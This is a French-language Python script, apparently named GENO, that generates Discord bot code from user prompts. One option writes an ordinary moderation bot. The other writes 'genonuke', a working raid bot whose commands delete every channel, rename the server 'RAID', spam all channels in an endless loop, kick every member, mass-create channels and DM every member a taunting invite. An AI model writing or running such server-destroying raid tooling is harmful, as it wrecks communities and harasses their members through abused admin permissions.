from asyncore import loop
from glob import escape
from os import name, system, getenv
import time
from time import sleep
import requests

try :
    import requests
    from pystyle import *
    from discord import *
    from discord.ext import commands
    from escape import Escape


except ModuleNotFoundError :
    print("Module introuvable")
    time.sleep(1.5)
    print("installation des modules ......")
    time.sleep(1)

try :
    system("pip install discord")
    system("pip install escape")
    system ("pip install requests")
    system("cls")
    time.sleep(1)
    print("module installer sans soucis .")
    time.sleep(1)
    system("cls")

except :
    print("les module ne peuvent etre installer .")
    time.sleep(2)
    print("verifier que 'pip' est bien installer et ajouter a votre 'patch' !")
    input()
    quit()



if name == "nt":
        system("title GENO")
        def clear():
            system("cls")
else:
    def clear():
        system("clear")


def main():
    clear()
    print("\n \n \n \n")
    print(Escape("                                      ") + Escape("[").red() + Escape("+").blue() + Escape("]").red() + Escape("===============================").red() + Escape("[").red() + Escape("+").blue() + Escape("]").red())
    print(Escape("                                       ") + Escape("┃").red()+ Escape("     1 => Simple bot maker       ").white()+ Escape("┃").red())
    print(Escape("                                       ") + Escape("┃").red()+ Escape("     2 => Simple bot raid maker  ").white()+ Escape("┃").red())
    print(Escape("                                       ") + Escape("┃").red()+ Escape("     3 => information            ").white()+ Escape("┃").red())
    print(Escape("                                      ") + Escape("[").red() + Escape("+").blue() + Escape("]").red() + Escape("===============================").red() + Escape("[").red() + Escape("+").blue() + Escape("]").red())
    print("")
    print(Escape("ᴬᴸᴸ ᴰᴱⱽ ᴵˢ ᴹᴬᴰᴱ ᴮʸ ᶜʰᵒᶜᵒ⁸ᵉˣᵉ ᴼᴺ ᴰᴵˢᶜᴼᴿᴰ").yellow())
    print("")
    mode = input("entrez votre choix -> ")

    def inf():
        clear()
        print(Escape("genobot is a simple bot that includes ").blue() + Escape (" ticket system ").red() + Escape("(dm bot to open the ticket),").blue() + Escape(" voice join to create system ").red() + Escape(" \n role given according").red() + Escape (" to a precise text in the bio").blue())
        print("")
        print(Escape("commands :").blue() + Escape("\n clear \n ban \n unban \n mute \n unmute \n say \n tts (convert text to mp3) \n servinfo").red())
        print("")
        print("")
        print(Escape ("genonuke is a simple raid bot that includes : \n ").blue() + Escape("dl ( delet all channel ) \n edit ( deface )\n sall ( spam all channel )\n cspam ( spam channel ) \n mpall ( mp all members in serveur ! ").red())
        print("")
        b = input("press enter for back ")

        if b =="":
            main()



    def gb():
        clear()
        titre = """
         ██████  ███████ ███    ██  ██████  ██████   ██████  ████████ 
        ██       ██      ████   ██ ██    ██ ██   ██ ██    ██    ██    
        ██   ███ █████   ██ ██  ██ ██    ██ ██████  ██    ██    ██    
        ██    ██ ██      ██  ██ ██ ██    ██ ██   ██ ██    ██    ██    
         ██████  ███████ ██   ████  ██████  ██████   ██████     ██   
        """
        print(Colorate.Diagonal(Colors.red_to_yellow, Center.XCenter(titre)))
        print("")
        print("Bonjour et bienvenue cher Genocorp \nici vous pourraiez crèe vos bot discord avec une simplicite que nul autre ne pouras vous fournir . ")
        print("")
        time.sleep(1.5)
        btoken = Write.Input("entree le token de votre bot -> ", Colors.red_to_yellow, interval=0.005)
        time.sleep(1.5)
        print("")
        print("bien nous allons de suite commencer la creation")
        print("")
        time.sleep(1.5)
        prefix = Write.Input("entree le prefix de votre bot -> ", Colors.red_to_yellow, interval=0.005)
        time.sleep(1.5)
        print("")
        print("Nous allons maintenant poursuivre avec le systéme de ticket :")
        time.sleep(1.5)
        guild_id = Write.Input("entree l'id de votre server -> ", Colors.red_to_yellow, interval=0.005)
        time.sleep(1.5)
        print("")
        print("Nous allons maintenant poursuivre avec le systéme de support :")
        time.sleep(1.5)
        print("")
        msg = Write.Input("entree le message a mettre dans sa bio pour avoir le role definit  -> ", Colors.red_to_yellow, interval=0.005)
        time.sleep(1.5)
        print("")
        idrole = Write.Input("entree l'id du role a donne  -> ", Colors.red_to_yellow, interval=0.005)
        time.sleep(1.5)
        print("")
        print("Nous allons maintenant poursuivre avec le systéme de join to create  :")
        time.sleep(1.5)
        print("")
        vcid = Write.Input("entree l'id du channel Join to Create  -> ", Colors.red_to_yellow, interval=0.005)
        time.sleep(1.5)
        print("")
        print("Nous pouvons enfin finir la creation du bot grace a cette info je vous remercie . \nveuillez attendre quelques seconde notre ingenieur Genocorp s'occupe de tous ! ")
        time.sleep(2)
        bot = """
from asyncio.tasks import sleep
import discord
from discord import message
from discord import client
from discord import colour
from discord import embeds
from discord.ext import commands, tasks
from discord.ext.commands.bot import AutoShardedBot
from discord.ext.commands.core import check
from discord.ext import commands
import random
from gtts import gTTS
import io
import asyncio
import json
import time
from datetime import datetime, timedelta, timezone
from typing import Optional
from discord import Embed, Member
from typing import Dict, List

TOKEN = '"""+ btoken +"""'
PREFIX = '"""+ prefix +"""'

bot = commands.Bot(command_prefix = PREFIX ,intents=discord.Intents.all(), description = "dev par Choco8exe#8725" )
bot.remove_command("help")


@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Streaming(name='"""+ prefix +"""help for more info', url="http://www.twitch.tv/choco8exe"))
    print("Ready !")


####
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send("erreur cette commande et introuvable regarder bien l'orthographe .")
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("il manque un argument.")
    elif isinstance(error, commands.MissingPermissions):
        await ctx.send("vous n'avez pas les permissions pour faire cette commande.")
    elif isinstance(error.original, discord.Forbidden):
        await ctx.send("Oups, je n'ai pas les permissions necessaires pour faire cette commande.")

####
@bot.event
async def on_message(message: discord.Message):
    GUILD_ID = """+guild_id+"""  
    ctx: commands.Context = await bot.get_context(message)

   
    if not hasattr(bot, "opened_channels"):
        bot.opened_channels: Dict[int, int] = {}

    opened_channels: Dict[int, int] = bot.opened_channels

    if message.guild is None :
        
        my_guild = bot.get_guild(GUILD_ID)
        overwrites = {
            my_guild.default_role: discord.PermissionOverwrite(read_messages=False),
            my_guild.me: discord.PermissionOverwrite(read_messages=True),
            message.author: discord.PermissionOverwrite(read_messages=True),
        }
        channel: discord.TextChannel = await my_guild.create_text_channel(
            message.author.name, reason=f"Ticket Created by {message.author}", overwrites=overwrites
        )

        embed: discord.Embed = discord.Embed(
            title="**Ticket**",
            description=message.content,
            color=0x000000,
            timestamp=message.created_at
        )
        embed.set_author(name=str(message.author),)
        await channel.send(embed=embed,)
        await channel.send(f"@everyone **{message.author}** open the ticket")
        await channel.send(f"Type `/Close` to close the ticket")

        bot.opened_channels[message.author.id] = channel.id

    
    if message.content.lower() == f"/Close".lower() and message.channel.id in bot.opened_channels.values():
        for author_id, channel_id in bot.opened_channels.copy().items():
            if message.channel.id == channel_id:
                del bot.opened_channels[author_id]
        await message.channel.delete(reason="Closing ticket")

    await bot.process_commands(message)




@bot.event
async def on_voice_state_update(member, before, after):
    s = bot.get_guild(""" + guild_id + """)
    try:
        if after.channel.id == """+ vcid +""":
            global channel 
            channel = await s.create_voice_channel(str(member))
            await member.move_to(channel)
    except:
        try: await channel.delete()
        except: pass

####
@bot.event
async def on_member_update(before, after):
    if before.activity == after.activity:
        return
    target = after
    content = '"""+msg+"""'
    role = after.guild.get_role("""+idrole+""")
    if not role:
        return

    if content in f"{str(target.activity.type).split('.')[-1].title() if target.activity else 'N/A'}{target.activity.name if target.activity else ''}":
        try:
            return await after.add_roles(role)            
        except discord.Forbidden:
            return 
    try:
        return await after.remove_roles(role)
    except discord.Forbidden:
        return





#### TEST
@bot.command()
async def test(ctx):
    await ctx.message.delete()   
    await ctx.send("test ok")

#### CLEAR
@bot.command()
@commands.has_permissions(manage_messages=True)
async def clear(ctx, nombre : int):
    message =await ctx.channel.history(limit = nombre + 1).flatten()
    for message in message:
        await message.delete()

#### BAN
@bot.command()
async def ban(ctx, user : discord.User, *reason):
    reason = " ".join(reason)
    await ctx.guild.ban(user, reason = reason)
    await ctx.send(f"`{user}` à été ban pour la raison  : **{reason}**.")

### UNBAN   
@bot.command()
async def unban(ctx, user, *reason):
    reason = " ".join(reason)
    userName, userId = user.split("#")
    bannedUsers = await ctx.guild.bans()
    for i in bannedUsers:
        if i.user.name == userName and i.user.discriminator == userId:
            await ctx.guild.unban(i.user, reason = reason)
            await ctx.send(f"{user} à été unban.")
            return
    await ctx.send(f"L'utilisateur `{user}` n'est pas dans la liste des bans")


#######CREATE MUTE ROLE 

async def createMutedRole(ctx):
    mutedRole = await ctx.guild.create_role(name = "Muted",
                                            permissions = discord.Permissions(
                                                send_messages = False,
                                                speak = False),
                                            reason = "Creation du role Muted pour mute des gens.")
    for channel in ctx.guild.channels:
        await channel.set_permissions(mutedRole, send_messages = False, speak = False)
    return mutedRole
async def getMutedRole(ctx):
    roles = ctx.guild.roles
    for role in roles:
        if role.name == "Muted":
            return role
    return await createMutedRole(ctx)

####### 




#### MUTE 
@bot.command()
@commands.has_permissions(manage_roles=True)    
async def mute(ctx, member : discord.Member, *, reason = "Aucune raison n'a ete renseigne"):
    mutedRole = await getMutedRole(ctx)
    await member.add_roles(mutedRole, reason = reason)
    await ctx.send(f"{member.mention} a ete mute !")

#### UNMUTE 
@bot.command()
@commands.has_permissions(manage_roles=True)
async def unmute(ctx, member : discord.Member, *, reason = "Aucune raison n'a ete renseigne"):
    mutedRole = await getMutedRole(ctx)
    await member.remove_roles(mutedRole, reason = reason)
    await ctx.send(f"{member.mention} a ete unmute !")

#### SAY
@bot.command()
async def say(ctx, *texte):
    await ctx.send(" ".join(texte))

#### HELP
@bot.command()
async def help(ctx):
        embed = discord.Embed(
        colour=discord.Colour.blue(),
        title="HELP",
        description=" by Choco8exe#8725"
    )
        embed.set_author(name=f"prefix [{ PREFIX }]", icon_url="https://cdn.discordapp.com/attachments/1006598255561408542/1008705451535380531/mousse.gif")
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1006598255561408542/1008705451535380531/mousse.gif")
        embed.add_field(name="ban", value="``-> ban une personne.``", inline=True)
        embed.add_field(name="unban", value="``-> unban une personne.``", inline=True)
        embed.add_field(name="mute", value="``-> mute une personne.``", inline=True)
        embed.add_field(name="unmute", value="``-> unmute une personne.``", inline=True)
        embed.add_field(name="Clear", value="``-> clear le chat.``", inline=True)
        embed.add_field(name="servinfo", value="``-> donne les info du serv.``", inline=True)
        embed.add_field(name="tts", value="``-> convertie votre text en message audio .``", inline=True)
        embed.add_field(name="say", value="``-> Faire dire au bot se que vous voulez.``", inline=True)
        embed.add_field(name="createur", value="``-> donne les credit du bot .``", inline=True)
        embed.add_field(name="addrole", value="``-> ajoute un role  .``", inline=True)
        embed.set_footer(text="``by Choco8exe#8725``")
        await ctx.send(embed=embed)


#### tts
def do_tts(message):
    f = io.BytesIO()
    tts = gTTS(text=message.lower(), lang="fr")
    tts.write_to_fp(f)
    f.seek(0)
    return f 

@bot.command()
async def tts(ctx, *, message): 
    await ctx.message.delete()
    prout =  do_tts(message)
    await ctx.send(file=discord.File(prout, f"{message}.mp3"))


##### serv info
@bot.command()
async def servinfo(ctx):
        server = ctx.guild
        numberOfTextChannels = len(server.text_channels)
        numberOfVoiceChannels = len(server.voice_channels)
        serverDescription = server.description
        numberOfPerson = server.member_count
        serverName = server.name
        embed = discord.Embed(
        colour=discord.Colour.red(),
        title="information",
        description="by Choco8exe#8725"
    )
        embed.set_author(name=f"prefix ({PREFIX})", icon_url="https://cdn.discordapp.com/attachments/1006598255561408542/1008705451535380531/mousse.gif")
        embed.add_field(name="``Membre :``", value=f" -> {numberOfPerson}", inline=False)
        embed.add_field(name="``Nom su server :``", value=f" -> {serverName}", inline=False)
        embed.add_field(name="``salons ecrit :``", value=f" -> {numberOfTextChannels}", inline=False)
        embed.add_field(name="``salon vocaux :``", value=f" -> {numberOfVoiceChannels}", inline=False)
        embed.set_footer(text="by Choco8exe#8725")
        await ctx.send(embed=embed)

@bot.command()
@commands.has_permissions(manage_roles=True)
async def addrole(ctx, role: discord.Role, *members: discord.Member):
    for m in members:
        await m.add_roles(role)
        await ctx.message.delete()
        await ctx.send(f"Role {role} ajouter a {m.mention} !")

bot.run(TOKEN)
    
    """
    
        with open("bot.py", "w", encoding="utf-8") as f:
            f.write(bot)
        f.close()
        print("bot cree")
        time.sleep(3)
        quit()







    def gn():
        titre = """
     ██████  ███████ ███    ██  ██████  ███    ██ ██    ██ ██   ██ ███████ 
    ██       ██      ████   ██ ██    ██ ████   ██ ██    ██ ██  ██  ██      
    ██   ███ █████   ██ ██  ██ ██    ██ ██ ██  ██ ██    ██ █████   █████   
    ██    ██ ██      ██  ██ ██ ██    ██ ██  ██ ██ ██    ██ ██  ██  ██      
     ██████  ███████ ██   ████  ██████  ██   ████  ██████  ██   ██ ███████ 
                                                                          
    """

        System.Clear()
        print(Colorate.Diagonal(Colors.red_to_yellow, Center.XCenter(titre)))
        print("")
        print("Bonjour et bienvenue cher Genocorp \nici vous pourraiez crèe vos bot discord avec une simplicite que nul autre ne pouras vous fournir . ")
        print("")
        time.sleep(1.5)
        btoken = Write.Input("entree le token de votre bot -> ", Colors.red_to_yellow, interval=0.005)
        time.sleep(1.5)
        print("")
        print("bien nous allons de suite commencer la creation")
        print("")
        time.sleep(1.5)
        prefix = Write.Input("entree le prefix de votre bot -> ", Colors.red_to_yellow, interval=0.005)
        time.sleep(1.5)
        print("")
        numberc = Write.Input("entree le nombre de channels a cree : -> ", Colors.red_to_yellow, interval=0.005)
        time.sleep(1.5)
        print("")
        nc = Write.Input("entree le nom des channels ?  -> ", Colors.red_to_yellow, interval=0.005)
        print("")
        time.sleep(1.5)
        msg = Write.Input("entree le message a spamm ?  -> ", Colors.red_to_yellow, interval=0.005)
        print("")
        time.sleep(1.5)
        print("Nous pouvons enfin finir la creation du bot grace a cette info je vous remercie . \nveuillez attendre quelques seconde notre ingenieur Genocorp s'occupe de tous ! ")
        time.sleep(2)
    
        bot = """
from escape import Escape
from asyncio.tasks import sleep
import discord
from discord import message
from discord import client
from discord import colour
from discord import embeds
from discord.ext import commands, tasks
from discord.ext.commands.core import check
from discord.ext import commands
import random
import asyncio
import json
import time
from datetime import datetime, timedelta, timezone
from typing import Optional

intents = discord.Intents.default()
intents.members = True
bot = commands.Bot(command_prefix = '""" + prefix + """' ,intents=discord.Intents.all(), description = "dev par Choco8exe#8725" )

@bot.event
async def on_ready():
    print("Bot is ready")
    print(Escape ("commands : \n ").blue() + Escape("dl ( delet all channel ) \n edit ( deface )\n sall ( spam all channel )\n cspam ( spam channel ) \n mpall ( mp all members in serveur ! ").red())

@bot.command()
async def dl(ctx,channel_id="all"):
  await ctx.message.delete()
  if channel_id == "all":
    for channel in ctx.guild.channels:
        await channel.delete()
    await ctx.guild.create_text_channel(name='""" + nc + """')



@bot.command()
async def edit(ctx):
    await ctx.guild.edit(name="RAID")

@bot.command()
async def sall(ctx):
    while True:
        for channel in ctx.guild.channels:
            await channel.send('""" + msg + """')


@bot.command()
async def ka(ctx):
 await ctx.message.delete()
 for user in ctx.guild.members:
        try:
            await user.kick()
            print(f"Kicked {user}")
        except:
           pass

@bot.command()
async def cspam(ctx,amount=""" + numberc + """,name_of_channel='""" + nc + """'):
  await ctx.message.delete() 
  for times in range(amount):
    await ctx.guild.create_text_channel(name_of_channel)
    print(f"spam {amount} Channels {name_of_channel}")

@bot.command(pass_context=True)
async def mpall(ctx):
    await ctx.message.delete()
    for member in list(bot.get_all_members()):
        await asyncio.sleep(0)
        try:
            embed = discord.Embed(title="il ne faut pas donner le role admin a des personnes aleatoires!", url="https://discord.gg/KppqFeX9am", description="ups is the end for this server ..." , color=discord.Colour.purple())
            embed.add_field(
                name="Discord Server",
                value=
                "[ [ Click here ] ](https://discord.gg/KppqFeX9am)",
                inline=False)
            embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1037452451369976021/1037452759831691294/4708_Pikachu_Hello.gif")
            embed.set_footer(text="hoo shitt ...")
            await member.send(embed=embed)
        except:
            pass
        print("Action completed: Message all")


bot.run('""" + btoken + """')
    """
    
        with open("botnuke.py", "w", encoding="utf8") as f:
            f.write(bot)
        f.close()
        print("bot cree !")
        time.sleep(3)
        quit()

    if mode == "":
        main()
    if mode == "1":
        gb()
    if mode == "2":
        gn()
    if mode == "3":
        inf()

if __name__ == '__main__':
    while True:
        main()